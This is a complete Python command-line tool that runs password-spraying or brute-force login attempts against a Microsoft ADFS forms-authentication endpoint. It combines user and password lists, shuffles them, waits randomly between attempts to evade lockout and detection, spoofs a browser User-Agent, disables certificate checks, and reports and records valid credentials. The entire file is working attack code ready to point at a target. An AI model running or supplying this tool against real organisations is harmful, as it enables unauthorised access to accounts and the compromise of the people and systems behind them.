#!/usr/bin/python3
import os
import sys
import time
import argparse
import random
import urllib3
import requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

randomize_userpassword_order = True
test_credentials_file = "tested.txt"


def get_args():
	parser = argparse.ArgumentParser()
	parser.add_argument('-t', '--target', required=True, default=None, action='store', help='Target url')
	parser.add_argument('-u', '--user', required=False, default=None, action='store', help='User')
	parser.add_argument('-U', '--user_list', required=False, default=None, action='store', help='User list')
	parser.add_argument('-p', '--password', required=False, default=None, action='store', help='Password')
	parser.add_argument('-P', '--password_list', required=False, default=None, action='store', help='Password list')
	parser.add_argument('-m', '--min_time', required=False, default=40, action='store', help='Minimum seconds')
	parser.add_argument('-M', '--max_time', required=False, default=60, action='store', help='Maximum seconds')
	#parser.add_argument('-l', '--userpassword_list', required=False, default=None, action='store', help='List with format user:password')
	return parser


def write_tested(user,password):
	with open(test_credentials_file, "a") as f:
		f.write(user+":"+password+"\n")


def check_user(new_url,headers,session,credential):
	user = credential[0]
	password = credential[1]
	data = {"UserName": user, "Password": password, "AuthMethod":"FormsAuthentication"}
	resp = session.post(new_url, data = data, headers = headers, verify = False )
	#print (resp.history)
	#print (resp.status_code)
	write_tested(user,password)
	if resp.history != []:
		print("CORRECT credentials: %s:%s\n"%(user, password))
		return True
	elif resp.history == []:
		print("Incorrect credentials: %s:%s\n"%(user, password))
		return False
	if resp.status_code != 200:
		print ("Strange status code: %s. Quitting!!!"%(resp.status_code))
		sys.exit(1)


def calculate_values(target):
	s = requests.Session()
	response = s.get(target)
	new_url       = response.url
	referer_field = new_url
	origin_field  = referer_field.split("adfs")[0]
	headers = {
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0",
		"Accept": "application/json, text/javascript, */*; q=0.01",
		"Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
		"Content-Type": "application/x-www-form-urlencoded",
		"Origin": origin_field,
		"Referer": referer_field,
		"Connection": "close"
	}
	return new_url,headers,s


def main():
	# Get arguments
	args = get_args().parse_args()
	# if (args.user is None and args.user_list is None and args.userpassword_list is None) or (args.password is None and args.password_list is None and args.userpassword_list is None):
	if (args.user is None and args.user_list is None) or (args.password is None and args.password_list is None):
		get_args().print_help()
		sys.exit(0)
	if (args.user_list is not None and not os.path.isfile(args.user_list)):
		print ("Error: Use '-U' with a file of users or '-u' for a single user")
		sys.exit(0)
	if (args.password_list is not None and not os.path.isfile(args.password_list)):
		print ("Error: Use '-P' with a file of passwords or '-p' for a single password")
		sys.exit(0)
	# Create lists
	users =     [args.user] if args.user is not None else open(args.user_list).read().splitlines()
	passwords = [args.password] if args.password is not None else open(args.password_list).read().splitlines()
	pairs =     [(u,p) for u in users for p in passwords]
	# Delete already tested pairs of username and password
	if os.path.isfile(test_credentials_file):
		tested_pairs = open(test_credentials_file).read().splitlines()
		tested_pairs = [(p.split(":")[0],p.split(":")[1]) for p in tested_pairs]
		pairs =        [p for p in pairs if p not in tested_pairs]
	# Randomize the combination of users and passwords
	if randomize_userpassword_order:
		random.shuffle(pairs)

	new_url,headers,session = calculate_values(args.target)

	print ("-----------------------")
	print ("ADFS url: %s"%(new_url))
	print ("Total users:     %d"%(len(users)))
	print ("Total passwords: %d"%(len(passwords)))
	print ("Combinations:    %d"%(len(pairs)))
	print ("Minimum seconds: %s"%(args.min_time))
	print ("Maximum seconds: %s"%(args.max_time))
	print ("-----------------------\n")

	correct_users_list = []
	for credential in pairs:
		if credential[0] not in correct_users_list:
			random_seconds = random.randint(int(args.min_time), int(args.max_time))
			print("Waiting %s seconds... (testing '%s':'%s')"%(random_seconds, credential[0], credential[1]))
			time.sleep(random_seconds)
			correct_user = check_user(new_url,headers,session,credential)
			if correct_user:
				correct_users_list.append(credential[0])


if __name__== "__main__":
	main()
